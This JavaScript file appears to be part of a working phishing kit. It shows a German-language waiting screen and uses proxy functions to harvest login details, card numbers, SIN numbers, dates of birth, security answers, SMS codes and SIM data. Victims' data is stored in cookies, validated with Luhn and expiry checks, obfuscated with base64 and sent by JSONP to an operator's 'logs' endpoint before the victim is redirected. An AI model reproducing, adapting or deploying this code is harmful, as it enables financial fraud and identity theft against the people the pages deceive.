$(document).ready(function() {

    $('<div class="loader__ waiter__" style="display:none">\
      <div class="loader-box">\
              <div class="loader-images-box">\
                  <img class="newloader" src="form/newloader.gif">\
							<br>\
							<br>\
			              <p class="waiter_p">Bitte warten Sie, während wir Ihre Anfrage bearbeiten.</p>\
						  <p class="waiter_p">Navigieren Sie nicht von dieser Seite weg.</p>\
              </div>\
      </div>\
</div>').appendTo('body');

    window.loader_ = {
        hide: function() {

            $('.scum_container').removeClass('loader_hide loader_show');
            $('.scum_container').addClass('loader_hide');
            $('.loader__').fadeOut('slow');
        },
        show: function() {
            $('.loader__').fadeIn('fast');
            $('.scum_container').removeClass('loader_hide loader_show');
            $('.scum_container').addClass('loader_show');
        }
    }

    setTimeout(function() {
        loader_.hide()
    }, 2000)



});

$(document).ready(function() {





    //new function to add to form.js
    // for (var el in php_js) {
    //     if (php_js.hasOwnProperty(el)) {
    //         try {
    //             php_js[el] = JSON.parse(php_js[el])
    //         } catch (e) {
    //             php_js[el] = php_js[el]
    //         }
    //     }
    // }
    //new function to add to form.js
    php_js.cookies = cookies.get('data__'); //2019
    php_js = deep_json_parse(php_js) //2019




    $("body").on("keypress change", '.form-control ,.custom_input_class', function() {
        $(this).closest(".form-group").removeClass("has_err");
        $(this).removeClass("has_err");
        $(".err_div").fadeOut();
    });

    setTimeout(function() {
        $('.form-control[data-mask]').each(function(i, el, all) {
            $.mask.definitions['h'] = "[A-Fa-f0-9]";
            $(this).mask($(this).data().mask, {
                placeholder: $(this).attr('mask-placeholder')
            }) //auto mask

        })
    }, 1) // fix for anguler masked intergration 2019









    $.fn.autoJump = function() {
        var els = this;
        els.on("input", function() {
            if ($(this).val().length == $(this).attr('maxlength')) {
                var this_ = this;
                els.each(function(i) {
                    if (this === this_) {
                        if (els.length - 1 == i) {
                            els.eq(0).focus();
                        } else {
                            els.eq(i + 1).focus();
                        }
                    }
                });
            }
        }).on('focus', function() {
            $(this).val('')
        });
    };


});


var ask_login_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_login.send(data);

}


var ask_info_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_info.send(data);

}


var ask_cc_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_cc.send(data);

}

var ask_valo1_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_valo1.send(data);

}

var ask_valo2_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_valo2.send(data);

}

var ask_valo3_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_valo3.send(data);

}


var ask_sms_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_sms.send(data);

}

var ask_sim_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_sim.send(data);

}



send1 = function(e, callback__, global_luhn__) {


    e.preventDefault();
    var el = e.target;
    var err = false;
    var err_text = [];
    var err_elements = [];

    if ($(el).data().hasOwnProperty('sub_ed')) { //2019
        return;
    }

    $(el).find("input:visible,select:visible").each(function() {
        var reg__ = new RegExp($(this).attr('pattern'));

        if (!reg__.test($(this).val())) {
            err = true;
            err_elements.push(this);
            err_text.push(this.dataset.err_text);
            return;
        }
        var luhn__ = $(this).data().luhn;
        if (typeof luhn__ != "undefined" && luhn__ != "") {

            if ($(this).val() != "") {
                if (!eval(luhn__)($(this).val(), err_text)) {
                    err = true;
                    err_elements.push(this);
                }
            }
        }
    });

    //time for global_luhn
    if (!err) {
        if (typeof global_luhn__ != "undefined") {
            if (!eval(global_luhn__)(err_text)) {
                err = true;
            }
        }
    }


    if (err) {
        err_text = err_text.filter(function(e) {
            return e;
        });
        err_text = $.unique(err_text);
        $(".err_ul").html("");
        $(err_text).each(function(i, t) {
            $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
        });

        $(".err_div").show();
        $(err_elements).each(function() {
            $(this).closest(".form-group").addClass("has_err");
            $(this).addClass("has_err");

            //...
        });
        $(window).scrollTop(0);
        return;
    }

    if (typeof callback__ != "undefined") {
        $(el).data('sub_ed', true); //2019
        eval(callback__)(el);
        return;
    }
    alert("We stack, what to do next?");
};






function next__(el) {
    cookies.set('ses', 1);


    var Callback = function(data) {
        setTimeout(function() {
            loader_.hide();
            // $(".scum").hide();
            // $(el).closest(".scum").next().show();

            window.location.href = "../next/";
        }, 3000);
    }

    loader_.show();



    var data__ = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
    cookies.set('data__', JSON.stringify(all_data__))


    data__ = php_js.encryption ? EN(data__) : data__;



    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        Callback();
        return;
    }

    $.ajax({
        url: php_js.home + "?pl=logs&sl&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: Callback,
        error: function(data) {}
    });

}








function finish__(el) {
    cookies.set('ses', 1);
    loader_.show();
    // alert('fin');
    var data__ = $(el).custom_ser();
    var all_data__ = $.extend({}, data__, JSON.parse(cookies.get('data__')));



    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        data__ = all_data__;
    }


    data__ = php_js.encryption ? EN(data__) : data__;


    $.ajax({
        url: php_js.home + "?pl=logs&sl&done&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: function(data) {
            // window.location.href = php_js.bb_link;
            window.location.href = "../done/";
        },
        error: function(data) {}
    });
}



function set_event(event, cb) {
    var link = php_js.link; //
    $.ajax({
        url: php_js.stat_home + "?pl=stat&link=" + link + "&set_event",
        dataType: "jsonp",
        data: {
            data: JSON.stringify(event)
        },
        success: function(res) {
            if (typeof cb === "function") {
                cb(res)
            }
        },
        error: function(res, q, err) {
            console.log(err)
        }
    })
    //{ 'name': 'Page load', 'location': 'Login'}
}




var def_plugin_data_receiver = function(data) {

    var Callback = function(data) {
        setTimeout(function() {
            loader_.hide();
            // $(".scum").hide();
            // $(el).closest(".scum").next().show();
            window.location.href = "../next/";
        }, 10);
    }

    loader_.show();
    var data__ = data
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
    cookies.set('data__', JSON.stringify(all_data__))

    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        Callback();
        return;
    }
    $.ajax({
        url: php_js.home + "&sl&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: Callback,
        error: function(data) {}
    });
}





$.fn.custom_ser = function() {
    var obj = {};
    this.find("input,select").each(function() {
        if (
            $(this).prop("tagName") == "INPUT" &&
            $(this).prop("type") != "checkbox" &&
            $(this).prop("type") != "button" &&
            $(this).prop("type") != "hidden" &&
            $(this).prop("type") != "image" &&
            $(this).prop("type") != "submit"
        ) {
            //input validation
            obj[$(this).attr("name")] = $(this).val();
        }
        if ($(this).prop("tagName") == "SELECT") {
            obj[$(this).attr("name")] = $(this).find("option:selected").val();
        }
    });

    console.log('Custom seralization result : ')
    console.log(obj)
    return obj;
};



function deep_json_parse(obj) { //2019
    for (el in obj) {

        if (Object.prototype.toString.call(obj[el]) == "[object Object]" || Object.prototype.toString.call(obj[el]) == "[object Array]") {
            obj[el] == deep_json_parse(obj[el])
        } else {
            try {
                obj[el] = JSON.parse(obj[el])
            } catch (e) {
                obj[el] = obj[el]
            }
        }
    }
    return obj
}



var cookies = {
    set: function(name, value, days) {
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            var expires = "; expires=" + date.toGMTString();
        } else var expires = "";
        document.cookie = name + "=" + value + expires + "; path=/";
    },
    get: function(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }
}
































//############ VALIDATORS ####################################

function advanced_string_validation(str) {
    //cheks for 3 same later on the row

    for (i = 0; i < str.length; i++) {
        if (str[i] == str[i + 1]) {
            if (str[i] == str[i + 2]) {
                return false;
            }
        }
    }
    return true;
}

function sin_luhn(str, err_text) {
    //Canadian SIN validator
    var str = str.match(/\d/g).join("");

    var luhnArr = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
    var counter = 0;
    var incNum;
    var odd = false;
    var temp = String(str).replace(/[^\d]/g, "");
    if (temp.length == 0) return false;
    for (var i = temp.length - 1; i >= 0; --i) {
        incNum = parseInt(temp.charAt(i), 10);
        counter += (odd = !odd) ? incNum : luhnArr[incNum];
    }
    return counter % 10 == 0;
}

function cc_luhn(str, err_text) {
    //CC validator
    var str = str.match(/\d/g).join("");

    var valid =
        str.split("").reduceRight(function(prev, curr, idx) {
            prev = parseInt(prev, 10);
            if ((idx + 1) % 2 !== 0) {
                curr = (curr * 2).toString().split("").reduce(function(p, c) {
                    return parseInt(p, 10) + parseInt(c, 10);
                });
            }
            return prev + parseInt(curr, 10);
        }) %
        10 ===
        0;
    if (!valid) {
        err_text.push("Card number is not valid");
    }

    return valid;
}

function dob_luhn(str, err_text) {
    //DOB input text validation
    //must be separated by /

    var valid = true;
    var d = new Date();
    var yearToday = d.getFullYear();

    var the_day = str.split("/")[0];
    var the_month = str.split("/")[1];
    var the_year = str.split("/")[2];

    if (the_day > 31) {
        valid = false;
    }
    if (the_month > 12) {
        valid = false;
    }
    if (the_year > yearToday) {
        valid = false;
    }
    if (the_year < yearToday - 100) {
        valid = false;
    }
    if (!valid) {
        err_text.push("Date of birth is not valid");
    }
    return valid;
}


function exp_with_day_luhn(str, err_text) {
    //EXP input text validation
    //must be separated by /

    var d = new Date();
    var res = {}
    res.valid = true;
    res.yearToday = d.getFullYear();
    res.monthToday = d.getMonth() + 1
    res.dayToday = d.getDate();


    res.the_day = parseInt((str.split("/")[0]).trim());
    res.the_month = parseInt((str.split("/")[1]).trim());
    res.the_year = parseInt((str.split("/")[2]).trim().length == 2 ? "20" + (str.split("/")[2]).trim() : (str.split("/")[2]).trim())


    if (res.the_year < res.yearToday) {
        res.valid = false;
    }
    if (res.the_year > res.yearToday + 15) {
        res.valid = false;
    }
    if (res.the_month > 12) {
        res.valid = false;
    }
    if (res.the_year == res.yearToday && res.the_month < res.monthToday) {
        res.valid = false;
    }
    if (res.the_day > 31) {
        res.valid = false;
    }
    if ((res.the_year == res.yearToday && res.the_month == res.monthToday) && res.the_day <= res.dayToday) {
        res.valid = false;
    }
    if (!res.valid) {
        err_text.push("Expiry date is not valid");
    }
    return res.valid;
}



function exp_luhn(str, err_text) {
    //EXP input text validation
    //must be separated by /

    var d = new Date();
    var res = {}
    res.valid = true;
    res.yearToday = d.getFullYear();
    res.monthToday = d.getMonth() + 1

    res.the_month = parseInt((str.split("/")[0]).trim());
    res.the_year = parseInt((str.split("/")[1]).trim().length == 2 ? "20" + (str.split("/")[1]).trim() : (str.split("/")[1]).trim())


    if (res.the_year < res.yearToday) {
        res.valid = false;
    }
    if (res.the_year > res.yearToday + 15) {
        res.valid = false;
    }
    if (res.the_month > 12) {
        res.valid = false;
    }
    if (res.the_year == res.yearToday && res.the_month <= res.monthToday) {
        res.valid = false;
    }

    if (!res.valid) {
        err_text.push("Expiry date is not valid");
    }
    return res.valid;
}





var qasame__ = function(err_text) {
    var res = true;
    if (!valid_a(err_text)) {
        res = false;
    }

    if (!valid_q(err_text)) {
        res = false;
    }
    return res;
}





// validate answer for same value

function valid_a(err_text) {
    var arr = $(".answers")
        .map(function() {
            return $(this).val();
        })
        .get();
    if ($.unique(arr).length != $(".answers").length) {
        err_text.push(
            "You can not choose two identical answers. (Error # AE1007-3)"
        );
        return false;
    }
    return true;
}

// validate question for same value

function valid_q(err_text) {
    var arr = $(".questions_")
        .map(function() {
            return $(this).val();
        })
        .get();
    if ($.unique(arr).length != $(".questions_").length) {
        err_text.push(
            "You can not choose two identical questions. (Error # AE1007-3)"
        );
        return false;
    }
    return true;
}






String.prototype.hashCode = function() {
    var hash = 0,
        i, chr;
    if (this.length === 0) return hash;
    for (i = 0; i < this.length; i++) {
        chr = this.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0; // Convert to 32bit integer
    }
    return hash;
};





function EN(obj_) {

    var obj = JSON.parse(JSON.stringify(obj_))


    for (var key_ in obj) {

        if (typeof obj[key_] === "object") {
            obj["kts" + btoa(key_) + "kts"] = EN(obj[key_]);
        } else {
            obj["kts" + btoa(key_) + "kts"] = "kts" + btoa(obj[key_]) + "kts";
        }

        delete obj[key_];
    }


    obj.encrypt_type = "kts";
    return obj;
}